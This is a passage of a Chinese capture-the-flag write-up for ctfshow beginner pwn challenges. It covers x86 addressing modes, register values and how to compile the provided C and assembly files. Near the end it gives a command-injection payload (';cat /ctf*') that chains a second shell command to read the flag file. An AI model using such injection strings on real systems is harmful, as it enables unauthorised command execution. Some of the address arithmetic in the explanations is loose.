href="#07-pwn6" class="headerlink" title="07 pwn6"></a>07 pwn6</h2><p>🚩flag：<code>ctfshow{114514}</code></p><p>💡hint：<code>计组原理</code></p><p>题目描述：立即寻址方式结束后eax寄存器的值为？</p><p>首先执行文件，结果跟上一题一样。</p><p>![截屏2025-08-11 15.08.48](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 15.08.48.png)</p><p>我们再来看源代码。</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line"></span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line"></span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line">                                                                                                                                                                                    </span><br></pre></td></tr></tbody></table></figure><p>看懂注释，就是11+114504-1=114514</p><p>即flag：ctfshow{114514}</p><hr><h2 id="08-pwn7"><a href="#08-pwn7" class="headerlink" title="08 pwn7"></a>08 pwn7</h2><p>🚩flag：<code>ctfshow{0x36D}</code></p><p>💡hint：<code>计组原理</code></p><p>题目描述：寄存器寻址方式结束后edx寄存器的值为？</p><p>题目文件相比还是和上一个题目一样。看到上一个题目的代码：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br></pre></td></tr></tbody></table></figure><p>故flag：<code>ctfshow{0x36D}</code></p><p>内存中一般大写（？）</p><hr><h2 id="09-pwn8"><a href="#09-pwn8" class="headerlink" title="09 pwn8"></a>09 pwn8</h2><p>🚩flag：<code>ctfshow{0x80490E8}</code></p><p>💡hint：<code>计组原理</code></p><p>题目描述：直接寻址方式结束后ecx寄存器的值为？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br></pre></td></tr></tbody></table></figure><p>注意这里是msg的地址，不是msg本身。</p><p>ida中查看得到：0x80490E8</p><p>相关资料：</p><h3 id="x86-汇编寻址方式详解"><a href="#x86-汇编寻址方式详解" class="headerlink" title="x86 汇编寻址方式详解"></a><strong>x86 汇编寻址方式详解</strong></h3><p>在你的代码中，展示了多种 x86 汇编寻址方式。以下是每种方式的详细说明和示例：</p><p><strong>1. 立即寻址（Immediate Addressing）</strong></p><p><strong>特点</strong>：操作数直接编码在指令中（常数）。<br>​<strong>用途</strong>​：用于赋值或算术运算。<br>​<strong>示例</strong>​：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov eax, 11      ; eax = 11（直接赋值）</span><br><span class="line">add eax, 114504  ; eax += 114504</span><br><span class="line">sub eax, 1       ; eax -= 1</span><br></pre></td></tr></tbody></table></figure><p><strong>2. 寄存器寻址（Register Addressing）</strong></p><p><strong>特点</strong>：操作数是寄存器。<br>​<strong>用途</strong>​：快速寄存器间数据传递。<br>​<strong>示例</strong>​：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov ebx, 0x36d  ; ebx = 0x36d</span><br><span class="line">mov edx, ebx    ; edx = ebx</span><br></pre></td></tr></tbody></table></figure><p><strong>3. 直接寻址（Direct Addressing）</strong></p><p><strong>特点</strong>：操作数是内存地址（符号或绝对地址）。<br>​<strong>用途</strong>​：访问全局变量或静态数据。<br>​<strong>示例</strong>​：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov ecx, msg    ; ecx = msg的地址（如 0x8049000）</span><br></pre></td></tr></tbody></table></figure><p><strong>4. 寄存器间接寻址（Register Indirect Addressing）</strong></p><p><strong>特点</strong>：操作数是寄存器指向的内存地址。<br>​<strong>用途</strong>​：通过指针访问内存。<br>​<strong>示例</strong>​：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov esi, msg    ; esi = msg的地址</span><br><span class="line">mov eax, [esi]  ; eax = *esi（解引用）</span><br></pre></td></tr></tbody></table></figure><p>⚠️ 注意：<code>[]</code> 表示解引用（类似 C 语言的 <code>*</code>）。</p><p><strong>5. 寄存器相对寻址（Register Relative Addressing）</strong></p><p><strong>特点</strong>：寄存器 + 偏移量访问内存。<br>​<strong>用途</strong>​：访问数组或结构体成员。<br>​<strong>示例</strong>​：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov ecx, msg    ; ecx = msg的地址</span><br><span class="line">add ecx, 4      ; ecx += 4（偏移4字节）</span><br><span class="line">mov eax, [ecx]  ; eax = *ecx</span><br></pre></td></tr></tbody></table></figure><p>相当于 <code>eax = msg[4]</code>（假设 <code>msg</code> 是字符数组）。</p><p><strong>6. 基址变址寻址（Base-Index Addressing）</strong></p><p><strong>特点</strong>：<code>基址寄存器 + 变址寄存器 * 比例因子</code>。<br>​<strong>用途</strong>​：高效访问多维数组或复杂数据结构。<br>​<strong>示例</strong>​：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov ecx, msg      ; ecx = 基址（msg地址）</span><br><span class="line">mov edx, 2        ; edx = 变址（索引2）</span><br><span class="line">mov eax, [ecx + edx*2]  ; eax = *(ecx + edx*2)</span><br></pre></td></tr></tbody></table></figure><p>相当于 <code>eax = msg[edx*2]</code>（假设每个元素占2字节）。</p><p><strong>7. 相对基址变址寻址（Relative Base-Index Addressing）</strong></p><p><strong>特点</strong>：<code>基址寄存器 + 变址寄存器 * 比例因子 + 偏移量</code>。<br>​<strong>用途</strong>​：灵活访问内存中的复杂结构。<br>​<strong>示例</strong>​：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov ecx, msg          ; ecx = 基址</span><br><span class="line">mov edx, 1            ; edx = 变址</span><br><span class="line">add ecx, 8            ; ecx += 8（基址偏移）</span><br><span class="line">mov eax, [ecx + edx*2 - 6]  ; eax = *(ecx + edx*2 - 6)</span><br></pre></td></tr></tbody></table></figure><p>相当于 <code>eax = msg[8 + edx*2 - 6]</code>。</p><p><strong>8. 系统调用中的寻址应用</strong></p><p>你的代码最后使用了 <strong>直接寻址</strong> 传递字符串地址：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov eax, 4          ; sys_write 系统调用</span><br><span class="line">mov ebx, 1          ; stdout</span><br><span class="line">mov ecx, msg        ; 字符串地址（直接寻址）</span><br><span class="line">mov edx, 22         ; 字符串长度</span><br><span class="line">int 0x80</span><br></pre></td></tr></tbody></table></figure><p>这里 <code>msg</code> 是直接寻址，而 <code>edx</code> 是立即寻址。</p><p><strong>寻址方式对比表</strong></p><table><thead><tr><th>寻址方式</th><th>语法示例</th><th>等效 C 语言</th><th>典型用途</th></tr></thead><tbody><tr><td><strong>立即寻址</strong></td><td><code>mov eax, 11</code></td><td><code>eax = 11;</code></td><td>常数赋值</td></tr><tr><td><strong>寄存器寻址</strong></td><td><code>mov edx, ebx</code></td><td><code>edx = ebx;</code></td><td>寄存器间数据传递</td></tr><tr><td><strong>直接寻址</strong></td><td><code>mov ecx, msg</code></td><td><code>ecx = &amp;msg;</code></td><td>访问全局变量</td></tr><tr><td><strong>寄存器间接寻址</strong></td><td><code>mov eax, [esi]</code></td><td><code>eax = *esi;</code></td><td>指针解引用</td></tr><tr><td><strong>寄存器相对寻址</strong></td><td><code>mov eax, [ecx+4]</code></td><td><code>eax = *(ecx + 4);</code></td><td>数组/结构体访问</td></tr><tr><td><strong>基址变址寻址</strong></td><td><code>mov eax, [ecx+edx*2]</code></td><td><code>eax = *(ecx + edx*2);</code></td><td>多维数组访问</td></tr><tr><td><strong>相对基址变址寻址</strong></td><td><code>mov eax, [ecx+edx*2-6]</code></td><td><code>eax = *(ecx + edx*2 - 6);</code></td><td>复杂数据结构访问</td></tr></tbody></table><p><strong>为什么需要多种寻址方式？</strong></p><ol><li><strong>灵活性</strong>：适应不同数据结构（如数组、链表、结构体）。</li><li><strong>效率</strong>：基址变址寻址可减少指令数量（如循环遍历数组）。</li><li><strong>可读性</strong>：直接映射高级语言的内存访问模式。</li></ol><p><strong>常见问题</strong></p><p>Q1: 为什么 <code>mov eax, [msg]</code> 和 <code>mov eax, msg</code> 结果不同？</p><ul><li><code>mov eax, msg</code>：将 <code>msg</code> 的地址存入 <code>eax</code>。</li><li><code>mov eax, [msg]</code>：将 <code>msg</code> 地址处的 <strong>值</strong> 存入 <code>eax</code>（解引用）。</li></ul><p>Q2: 如何选择寻址方式？</p><ul><li>访问简单变量 → <strong>直接寻址</strong></li><li>通过指针访问 → <strong>寄存器间接寻址</strong></li><li>数组遍历 → <strong>基址变址寻址</strong></li></ul><p>掌握这些寻址方式是理解汇编和逆向工程的基础！ 🚀</p><hr><h2 id="10-pwn9"><a href="#10-pwn9" class="headerlink" title="10 pwn9"></a>10 pwn9</h2><p>🚩flag：<code>ctfshow{0x636C6557}</code></p><p>💡hint：<code>计组原理</code> <code>汇编基础</code></p><p>题目描述：寄存器间接寻址方式结束后eax寄存器的值为？</p><p>文件片段：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 15.41.48](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 15.41.48.png)</p><p>![截屏2025-08-11 15.42.43](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 15.42.43.png)</p><p>![image-20250811154831715](/Users/serenius/Library/Application Support/typora-user-images/image-20250811154831715.png)</p><hr><h2 id="11-pwn10"><a href="#11-pwn10" class="headerlink" title="11 pwn10"></a>11 pwn10</h2><p>🚩flag：<code>ctfshow{ome_to_CTFshow_PWN}</code></p><p>💡hint：<code>计组原理</code> <code>汇编基础</code></p><p>题目描述：寄存器相对寻址方式结束后eax寄存器的值为？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line"></span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line"></span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br></pre></td></tr></tbody></table></figure><p>这里将msg的地址（0x80490E8）+ 4 处所执向的地址的值赋给eax</p><p>0x80490E8+4=0x80490EC</p><p>ctfshow{ome_to_CTFshow_PWN}</p><hr><h2 id="12-pwn11"><a href="#12-pwn11" class="headerlink" title="12 pwn11"></a>12 pwn11</h2><p>🚩flag：<code>ctfshow{ome_to_CTFshow_PWN}</code></p><p>💡hint：<code>计组原理</code> <code>汇编基础</code></p><p>基址变址寻址方式结束后的eax寄存器的值为？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line"></span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line"></span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br></pre></td></tr></tbody></table></figure><p>这里将msg的地址（0x80490E8) 复制给ecx</p><p>将2复制给edx，edx=2</p><p>eax=ecx+2*edx</p><p>=0x80490E8+4</p><p>=0x80490EC</p><p>ctfshow{ome_to_CTFshow_PWN}</p><hr><h2 id="13-pwn12"><a href="#13-pwn12" class="headerlink" title="13 pwn12"></a>13 pwn12</h2><p>🚩flag：<code>ctfshow{ome_to_CTFshow_PWN}</code></p><p>💡hint：<code>计组原理</code> <code>汇编基础</code></p><p>相对基址变址寻址方式结束后eax寄存器的值为？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line"></span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line"></span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br></pre></td></tr></tbody></table></figure><p>ecx=0x80490E8</p><p>edx=1</p><p>ecx=ecx+8</p><p>=0x80490E8+8</p><p>=0x80490F0</p><p>eax=ecx+edx*2-6</p><p>=0x80490F0-4</p><p>=0x80490EC</p><p>ctfshow{ome_to_CTFshow_PWN}</p><hr><h2 id="14-pwn13"><a href="#14-pwn13" class="headerlink" title="14 pwn13"></a>14 pwn13</h2><p>🚩flag：<code>ctfshow{hOw_t0_us3_GCC?}</code></p><p>💡hint：<code>二进制文件基础</code></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gcc -o flag flag.c</span><br><span class="line">./flag</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 18.19.47](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 18.19.47.png)</p><hr><h2 id="15-pwn14"><a href="#15-pwn14" class="headerlink" title="15 pwn14"></a>15 pwn14</h2><p>🚩flag：<code>ctfshow{01000011_01010100_01000110_01110011_01101000_01101111_01110111_00001010}</code></p><p>💡hint：<code>二进制文件基础</code></p><p>请你阅读以下源码，给定key为”CTFshow”，编译运行即可获得flag</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">    <span class="type">size_t</span> n;</span><br><span class="line">    fp = fopen(<span class="string">"key"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) {</span><br><span class="line">        perror(<span class="string">"Nothing here!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="type">char</span> output[BUFFER_SIZE * <span class="number">9</span> + <span class="number">12</span>]; </span><br><span class="line">    <span class="type">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">"ctfshow{"</span>);</span><br><span class="line">    <span class="keyword">while</span> ((n = fread(buffer, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>), BUFFER_SIZE, fp)) &gt; <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; n; i++) {</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">7</span>; j &gt;= <span class="number">0</span>; j--) {</span><br><span class="line">                offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">"%d"</span>, (buffer[i] &gt;&gt; j) &amp; <span class="number">1</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span> (i != n - <span class="number">1</span>) {</span><br><span class="line">                offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">"_"</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (!feof(fp)) {</span><br><span class="line">            offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">" "</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    offset += <span class="built_in">sprintf</span>(output + offset, <span class="string">"}"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, output);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>所以需要先写入key文件，然后编译运行文件。</p><p>![截屏2025-08-11 18.38.07](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 18.38.07.png)</p><hr><h2 id="16-pwn15"><a href="#16-pwn15" class="headerlink" title="16 pwn15"></a>16 pwn15</h2><p>🚩flag：<code>ctfshow{@ss3mb1y_1s_3@sy}</code></p><p>💡hint：<code>二进制文件基础</code></p><p>编译汇编代码到可执行文件，即可拿到flag</p><p>这段代码是一个使用 x86 汇编语言编写的程序，用于在标准输出上打印一串特定格式的字符串。 要将这段代码编译为可执行文件，使用汇编器和链接器进行以下步骤：</p><p>使用以下命令将汇编代码编译为目标文件:</p> <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">nasm -f elf flag.asm -o flag.o</span><br></pre></td></tr></tbody></table></figure><p>使用以下命令将目标文件链接为可执行文件：</p> <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ld -m elf_i386 -o flag flag.o</span><br></pre></td></tr></tbody></table></figure><p>运行此文件：</p> <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">./flag</span><br></pre></td></tr></tbody></table></figure><img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 18.44.53.png" alt="截屏2025-08-11 18.44.53" style="zoom:50%;"><hr><h2 id="17-pwn16"><a href="#17-pwn16" class="headerlink" title="17 pwn16"></a>17 pwn16</h2><p>🚩flag：<code>ctfshow{daniuniuda}</code></p><p>💡hint：<code>二进制文件基础</code></p><p>使用gcc将其编译为可执行文件</p><p><code>.s</code> 文件是汇编语言源文件的一种常见扩展名。它包含了使用汇编语言编写的程序代码。汇编语言是一种低级编程语言，用于直接操作计算机的指令集架构。 <code> .s</code> 文件通常由汇编器（Assembler）处</p><p>理，将其转换为可执行文件或目标文件。</p><p>可以使用 gcc 命令直接编译汇编语言源文件（<code>.s</code>文件）并将其链接为可执行文件。  gcc 命令具有适用于多种语言的编译器驱动程序功能，它可以根据输入文件的扩展名自动选择适当的编译器和链接器。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gcc -o flag flag.s</span><br><span class="line">./flag</span><br></pre></td></tr></tbody></table></figure><img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 18.46.30.png" alt="截屏2025-08-11 18.46.30" style="zoom:50%;"><hr><h2 id="18-pwn17"><a href="#18-pwn17" class="headerlink" title="18 pwn17"></a>18 pwn17</h2><p>🚩flag：<code>ctfshow{8f284eaf-6fc1-4a4c-92ee-eca8a266d137}</code></p><p>💡hint：<code>二进制文件基础</code> <code>Linux基础命令的拼接</code></p><p>有些命令好像有点不一样？</p><p>不要一直等，可能那样永远也等不到flag</p><img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 18.53.30.png" alt="截屏2025-08-11 18.53.30" style="zoom:50%;"><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">;<span class="built_in">cat</span> /ctf*</span><br></pre></td></tr></tbody></table></figure><p><strong>为什么Payload能工作？</strong></p><ol><li><strong>分号 <code>;</code> 的作用</strong>：</li></ol><ul><li>在Linux中，<code>;</code> 用于分隔多个命令，无论前一个命令是否成功。</li><li>例如：<code>command1 ; command2</code> 会依次执行 <code>command1</code> 和 